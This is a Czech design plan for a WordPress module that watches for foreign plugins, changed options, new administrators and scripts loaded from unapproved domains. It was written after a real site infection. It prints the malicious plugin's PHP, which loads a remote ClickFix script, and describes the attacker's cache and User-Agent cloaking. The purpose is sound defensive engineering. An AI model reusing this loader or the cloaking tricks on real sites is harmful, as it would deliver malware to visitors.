# Strážce integrity — plán modulu

> Stav: **návrh k dopracování.** Založeno 2026-09-21 na základě reálného incidentu na seco-traktory.cz.
> Cíl dokumentu: popsat, **co přesně** má modul dělat, aby zachytil třídu útoku, kterou nezachytil
> žádný z existujících nástrojů — náš `DetectionEngine` v UX1 včetně. Implementační detaily ani kód
> zde nejsou, ty patří do PLAN.md po odsouhlasení rozsahu.
>
> **Umístění:** UX Studio, ne UX1 plugin. UX1 je podle STAV.md zamrzlý (LEGACY, aktivní práce tam
> nepatří), slouží jen jako reference pro port. Z jeho modulu `security-optimization/upload-guard`
> se sem portuje `IntegrityChecker` — viz kap. 3.

---

## 1. Proč — co se stalo a proč to nikdo nenašel

**18. 9. 2026 v 16:02 UTC** se na seco-traktory.cz objevil plugin `clear-index`. Jediný soubor,
628 bajtů, a celý jeho funkční obsah byl tohle:

```php
function clean_index_head() {
    if (is_front_page() || is_home()) {
        wp_enqueue_script(
            'jquery-core-cdn',
            'https://kjhg.lol/js/jquery-3.7.1.migrate.js',
            array(), '3.7.1', false
        );
    }
}
add_action('wp_enqueue_scripts', 'clean_index_head', 99999);
```

Ten skript překryl web podvrženou Cloudflare stránkou „Verify you are human" a po kliknutí
vložil návštěvníkovi do schránky PowerShell downloader (ClickFix). Na webu to viselo **tři dny**.

### Co všechno mlčelo

| Nástroj | Výsledek |
|---|---|
| Malware skener hostingu (Hostinger) | nic |
| Sucuri SiteCheck | nic |
| Wordfence — známý malware, porovnání jádra / pluginů / šablon | nic |
| `wp core verify-checksums` | prošlo |
| grep na webshell vzory přes celý hostingový účet | nic |
| plný dump DB (157 MB) + grep na IoC | nic |

**A mlčel by i náš `DetectionEngine`** z UX1. Ten skóruje `eval`, `base64_decode`, `gzinflate`,
`str_rot13`, obfuskaci — v tom souboru **není ani jeden z těch vzorů**. Výsledné skóre 0,
tedy hluboko pod `THRESHOLD_WARNING = 16`.

### Poučení

> Škodlivá na tom nebyla **ani jedna konstrukce v kódu**. Škodlivá byla **jedna doména v URL**
> a **fakt, že ten plugin tam nikdo nedal**.

Hledat malware byla špatně položená otázka. Signature ani heuristika tuhle třídu principiálně
nezachytí a žádné dopisování vzorů do `DetectionEngine` to nezmění.

### Co to nakonec našlo

Že se někdo podíval, **co web reálně načítá v prohlížeči**, a uviděl cizí doménu ve `<script src>`.
Nic víc. Přesně tohle má modul dělat automaticky a nepřetržitě.

---

## 2. Princip: allowlist, ne blocklist

Modul **nehledá, co je škodlivé**. Drží si otisk toho, jak web vypadá, když je v pořádku,
a hlásí **odchylku od něj**.

- Blocklist se ptá: „je tenhle kód podobný známému malwaru?" → `clear-index` projde.
- Allowlist se ptá: „patří tahle doména / tenhle plugin / tenhle soubor sem?" → neprojde.

Tři otázky, na kterých to celé stojí:

1. Objevil se v `wp-content/plugins/` adresář, který tam nikdo nedal?
2. Změnil se `active_plugins` bez odpovídající akce v adminu?
3. Načítá web zdroj z domény, která není na seznamu povolených?

Na `clear-index` by odpověděly **čtyři nezávislé detektory** — během minut, ne za tři dny.

---

## 3. Zařazení v architektuře

### Vztah k tomu, co už existuje

| Existující | Co pokrývá | Kde končí |
|---|---|---|
| UX1 `upload-guard/IntegrityChecker` | jádro WP proti checksumům wordpress.org, klíčové soubory (`wp-config`, `.htaccess`, `mu-plugins`), oprávnění | **`wp-content` ignoruje záměrně** |
| UX1 `upload-guard/DetectionEngine` | heuristické skórování obsahu nahrávaných souborů | nezachytí kód bez škodlivých konstrukcí |
| `vulnerability-scanner` | známé CVE ve verzi WP a pluginů | neřeší cizí kód |
| `activity-log` | kdo co udělal v adminu | nevidí zásah mimo admin |
| `bot-throttle` | provoz a boti | neřeší obsah |

**Díra je přesně uprostřed:** `wp-content` + legitimně vypadající kód + zdroje, které web načítá.

### Doporučené umístění

Samostatný modul **`integrity-watch`** (pracovní název), ne rozšíření `security-optimization`.
Ten je i ve staré verzi přetížený — míchá login hardening, CSP, IP bany a upload guard
(v AUDIT.md klasifikovaný jako skupina C s pěti vlastními tabulkami).

Podle konvencí UX Studia:

```
includes/Modules/IntegrityWatch/
├── Bootstrap.php          (extends BaseModule)
├── AssetGuard.php         detektor 1 — enqueue hooky
├── FrontendProbe.php      detektor 2 — kontrola HTML zvenčí
├── FileBaseline.php       detektor 3 — hashe souborů ve wp-content
├── OptionWatch.php        detektor 4 — kritické options
├── AccountWatch.php       detektor 5 — administrátoři a app passwords
├── Allowlist.php          výjimky + learning mode
├── Baseline.php           otisk stavu (společný pro 3/4/5)
└── Reporter.php           hlášení

src/modules/integrity-watch/     React stránka (přehled, historie, allowlist)
```

Options pod konvencí `uxstudio_integrity-watch_settings`, REST pod namespace UX Studia.

### Co portovat z UX1

`IntegrityChecker` **znovupoužít, ne psát znovu.** Už umí checksumy wordpress.org, fallback na
lokální baseline a hlídání klíčových souborů. Nový `FileBaseline` řeší `wp-content`,
`IntegrityChecker` jádro — dohromady pokryjí celý web. Výsledky obou patří pod jednu obrazovku.

`DetectionEngine` ponechat jako **doplňkový signál** při hodnocení nově objeveného souboru
(„navíc obsahuje `eval`" = vyšší priorita), nikdy ne jako hlavní rozhodovací kritérium.

---

## 4. Detektory — co přesně mají dělat

### Detektor 1 — `AssetGuard` (za běhu, nejrychlejší reakce)

Napojit se na `script_loader_src` a `style_loader_src`. Každé URL, které WordPress chystá vložit
do stránky, projít proti allowlistu domén.

- Vlastní doména a subdomény → vždy povoleno.
- Relativní URL a `data:` → povoleno.
- Cizí doména mimo allowlist → **záznam s kontextem: handle, URL, soubor a řádek registrace.**

Kontext je zásadní. `clear-index` by se nahlásil jako:

```
handle "jquery-core-cdn" → kjhg.lol
registrováno v plugins/clear-index/index.php
```

To je rovnou celá diagnóza, ne jen podezření.

**Režimy:**
- `report` (výchozí) — jen zaznamenat a ohlásit.
- `block` — navíc `wp_dequeue_script()`. Pak je útok neškodný okamžitě a majiteli přijde
  jen e-mail. Zapínat vědomě, ne ve výchozím stavu.

> Handle bývá záměrně matoucí. `jquery-core-cdn` vypadá naprosto nevinně a v seznamu enqueued
> skriptů ho oko přejde. **Rozhoduje doména, ne jméno handlu.**

### Detektor 2 — `FrontendProbe` (cron, pojistka)

Stáhnout homepage a několik dalších URL **zvenčí přes HTTP** a vyparsovat `<script src>`,
`<iframe src>`, `<link href>`, `<form action>`. Domény porovnat s allowlistem.

Proč zvenčí, když detektor 1 je uvnitř: **zachytí i injekci, která nejde přes WP API vůbec** —
`.htaccess`, `auto_prepend_file`, podvržený soubor v šabloně, zásah na úrovni serveru.

**Dvě věci, které se tu nesmí zkazit** (obojí nás při vyšetřování reálně málem svedlo):

1. **Vynutit cache MISS.** Každý požadavek s náhodným parametrem (`?_iw=<random>`).
   Na seco-traktory vracel LiteSpeed při cache HIT čistou stránku a injekce se objevila
   **jen při MISS**. Sonda bez cache-bustu by tři dny hlásila „vše v pořádku".
2. **Realistický User-Agent.** Útok byl cloakovaný — `curl` s běžnými hlavičkami dostal čistou
   stránku, reálný prohlížeč podvrženou. Sonda musí posílat kompletní sadu hlaviček prohlížeče
   (`User-Agent`, `Accept`, `Accept-Language`, `Sec-Fetch-*`, `Upgrade-Insecure-Requests`).

Volitelně druhý průchod s `Referer: https://www.google.com/` — část kampaní se spouští jen
pro návštěvy z vyhledávače.

### Detektor 3 — `FileBaseline` (cron)

Hashe souborů v `wp-content/plugins`, `wp-content/themes`, `wp-content/mu-plugins`
a v kořeni webu, porovnané s uloženým otiskem.

Hlásit: **nový soubor**, **změněný soubor**, **nový adresář v `plugins/`**, **zmizelý soubor**.
Vážit podle typu — nový `.php` v `plugins/` nebo `mu-plugins/` je vážnější než změna `.css`,
nový `.php` v `uploads/` je kritický vždy.

**Výkon — poučení z dneška.** Wordfence na tom webu nedoběhl ani jednou ze sedmi pokusů, protože
se snažil přečíst 11 GB včetně 6,7 GB obrázků, a CloudLinux mu proces pokaždé zabil. Tenhle
detektor musí:

- brát **jen** přípony, kde může být kód (`php`, `js`, `html`, `htaccess`, `svg`, `phar`),
- z `uploads/` kontrolovat jen **existenci** spustitelných přípon, obsah nečíst,
- pracovat po dávkách s kurzorem uloženým mezi běhy, aby jeden běh trval sekundy,
- mít tvrdý strop na dobu běhu a navazovat v dalším cyklu.

### Detektor 4 — `OptionWatch` (hook + cron)

Sledovat: `active_plugins`, `siteurl`, `home`, `users_can_register`, `default_role`,
`admin_email`, `template`, `stylesheet`.

Hook `update_option_{name}` **plus** periodické ověření — hook se obejde přímým SQL zápisem.

`active_plugins` je klíčový: `clear-index` byl **aktivovaný**, což znamená buď přístup do adminu,
nebo přímý zápis do DB. Obojí je poplach.

### Detektor 5 — `AccountWatch` (hook + cron)

Nový uživatel s rolí administrátor, povýšení existujícího účtu na administrátora, nové
application password, změna e-mailu administrátora.

Na seco-traktory nový účet nepřibyl (útočník použil existující), ale je to levné hlídat
a u většiny napadení je to první krok.

---

## 5. Allowlist a výjimky

Tohle rozhoduje, jestli bude modul použitelný, nebo ho lidé po týdnu vypnou.

### Tři vrstvy

**a) Předvyplněný seznam** běžných CDN a služeb, dodávaný s modulem a aktualizovatelný:

```
ajax.googleapis.com, code.jquery.com, cdn.jsdelivr.net, cdnjs.cloudflare.com, unpkg.com,
fonts.googleapis.com, fonts.gstatic.com, www.googletagmanager.com, www.google-analytics.com,
region1.analytics.google.com, connect.facebook.net, www.clarity.ms, scripts.clarity.ms,
static.hotjar.com, www.youtube.com, youtu.be, player.vimeo.com, js.stripe.com,
maps.googleapis.com, www.gstatic.com, challenges.cloudflare.com, www.google.com/recaptcha
```

**b) Vlastní doména a subdomény** — automaticky, bez zásahu uživatele.

**c) Uživatelské výjimky** — u každého záznamu tlačítko „tohle je v pořádku" → doména se přidá
do allowlistu webu. Výjimka vždy na **doménu**, nikdy na handle nebo jméno souboru; jinak stačí
útočníkovi přejmenovat handle.

### Learning mode

Prvních **7 dní** (nastavitelné) modul jen sbírá a **nehlásí nic**. Po uplynutí z nasbíraného
sestaví baseline a teprve pak začne hlásit odchylky. Bez toho by na každém webu první den
vysypal třicet planých hlášek a skončil vypnutý.

> Zároveň je to riziko, které je třeba pojmenovat nahlas: je-li web napadený **už při zapnutí
> modulu**, learning mode si injekci uloží jako normální stav. Proto při prvním sestavení baseline
> **předložit majiteli seznam nalezených domén a pluginů k odsouhlasení**, ne ho tiše uložit.

### Chytřejší vrstva (k rozmyšlení)

Doménu z veřejného CDN seznamu hodnotit jinak než neznámou doménu registrovanou před týdnem.
Sekundární signály, pokud budou po ruce:

- stáří domény (WHOIS) — `kjhg.lol` byla čerstvá,
- TLD s vyšším rizikem (`.lol`, `.top`, `.xyz`, `.icu`, `.sbs`, `.cfd`),
- doména bez jediného dalšího výskytu na webu.

Nesmí to nahradit prosté pravidlo „není na seznamu → hlásím", jen upravit prioritu nálezu.

---

## 6. Aktualizace vs. útok

Nejčastější důvod, proč lidé tenhle typ nástroje vypnou: každá aktualizace vyvolá záplavu hlášek.

Řešení: při `upgrader_process_complete` se otisk dotčených souborů **tiše přepíše**. Totéž při
`activated_plugin` / `deactivated_plugin` provedených z adminu s platným nonce.

Hlásí se změna, která **není** doprovázená odpovídající akcí. Přesně to byl `clear-index` —
soubory se objevily, ale žádná instalace přes upgrader s tím nekorelovala.

> Detail, který to při vyšetřování potvrdil: adresář `wp-content/upgrade/` měl mtime shodný
> se vznikem pluginu, což znamená instalaci **přes wp-admin** — FTP na něj nesáhne.
> **Tenhle rozlišovací znak stojí za to hlídat taky**: říká nejen „něco přibylo", ale i „přibylo
> to cestou, která vyžaduje přihlášeného administrátora", což mění celou reakci na incident.

---

## 7. Hlášení

- **Admin notice** — jen pro kritické nálezy, s odkazem na detail.
- **E-mail** — okamžitě u kritických, denní souhrn u ostatních. Nikdy jeden e-mail na nález.
- **REST endpoint** pro centrální dohled (viz níže).
- **Vlastní log** s historií a stavem nálezu (`new` / `acknowledged` / `resolved` / `ignored`).

Každý nález musí nést **kontext, ne jen fakt**: co, kde, kdy, čím se liší od baseline —
a jedno tlačítko „je to v pořádku".

---

## 8. Napojení na centrální dohled

Tady je největší hodnota celé věci. REST endpoint, ze kterého si **app.ux1.cz** vytáhne stav
integrity všech webů v síti. Jedna obrazovka odpovídající na otázku:
*„na kterém z těch šedesáti webů se objevilo něco cizího?"*

Kdyby to existovalo 18. 9., přišel by e-mail ten den odpoledne místo objevu o tři dny později —
a web by nestihl rozdávat malware návštěvníkům.

Modul musí fungovat i bez centrální aplikace; ta je nadstavba, ne podmínka.

---

## 9. Úskalí ověřená v praxi

Věci, na které jsme při tomhle incidentu reálně narazili a které je třeba mít v hlavě:

1. **Cache maskuje injekci.** LiteSpeed HIT = čistá stránka, MISS = injekce. Vždy cache-bust.
2. **Cloaking podle User-Agentu.** `curl` viděl čistý web, prohlížeč podvržený.
3. **Nález ve formulářových datech není injekce.** V DB bylo 20 683 odkazů na ruské spam domény —
   všechno obsah z kontaktních formulářů v `e_submissions_values` a `wpml_mails`. Vždy je nutné
   vědět, **ve které tabulce a sloupci** nález je, než se z toho udělá poplach.
4. **Sdílený hosting má tvrdé limity.** Server měl load 60, CloudLinux zabíjel dlouhé PHP procesy
   bez jediného záznamu v logu. Krátké dávky s kurzorem, ne jeden dlouhý běh.
5. **`wp-admin/.rnd` a `wp-admin/cache/` nejsou hack.** OpenSSL seed a zbytky po WP Super Cache.
   Baseline potřebuje seznam známých neškodných výjimek, jinak bude hlásit nesmysly.
6. **Prázdná složka není plugin.** `plugins/uploads/matomo/` bez jediného souboru vypadá
   v seznamu podezřele, ale je to zbytek po odinstalaci.
7. **Non-blocking HTTP požadavek nenásleduje redirect.** Když má web `siteurl` na `http://`
   a běží na https, self-požadavky mizí v 301. Takhle na tom webu neběžel Wordfence scan.
   Pokud bude `FrontendProbe` nebo cron dělat self-požadavky, musí používat skutečnou
   veřejnou https URL, ne `site_url()` naslepo.

---

## 10. Co to nepokryje (ať je to řečeno rovnou)

- Injekci servírovanou **jen cizím IP nebo jen určité geolokaci** — sonda chodí z jednoho místa.
  Částečně by řešil centrální dohled, pokud by zkoušel z více uzlů.
- Škodlivý kód **uvnitř legitimního pluginu**, který projde oficiální aktualizací (supply chain).
- Zásah na úrovni hostingu **pod** WordPressem, pokud zároveň ovlivní i sondu.

---

## 11. Akceptační kritéria

Modul je hotový, když na testovacím webu zachytí **všech pět scénářů**:

- [ ] Nahrání `clear-index` (plugin s jediným enqueue na cizí doménu) → hlásí `AssetGuard` i `FileBaseline`
- [ ] Ruční vložení `<script src="https://cizi.example/x.js">` do šablony → hlásí `FrontendProbe`
- [ ] Přímý zápis do `active_plugins` v DB → hlásí `OptionWatch`
- [ ] Nový administrátor založený přes SQL → hlásí `AccountWatch`
- [ ] Regulérní aktualizace pluginu přes admin → **nehlásí nic**

A když na produkčním webu s běžnou sadou pluginů po skončení learning mode **týden mlčí**.

---

## 12. Postup prací

- [ ] Upřesnit rozsah MVP (návrh: detektory 1, 3, 4 + allowlist + learning mode)
- [ ] Zařadit modul do migrační mapy v AUDIT.md a do roadmapy v PLAN.md
- [ ] Navrhnout schéma baseline a logu nálezů (options vs. vlastní tabulka)
- [ ] Sestavit výchozí allowlist a ověřit ho na 5 reálných webech z parku
- [ ] Portovat `IntegrityChecker` z UX1 `upload-guard`
- [ ] `AssetGuard` v režimu report
- [ ] `FileBaseline` s dávkováním a kurzorem
- [ ] `OptionWatch` + `AccountWatch`
- [ ] `FrontendProbe` s cache-bustem a hlavičkami prohlížeče
- [ ] Learning mode + odsouhlasení první baseline
- [ ] Hlášení: admin notice, e-mail, REST
- [ ] React stránka v `src/modules/integrity-watch/`
- [ ] Napojení na centrální dohled app.ux1.cz
- [ ] Režim `block` pro `AssetGuard`
- [ ] Projít akceptační kritéria (kap. 11)
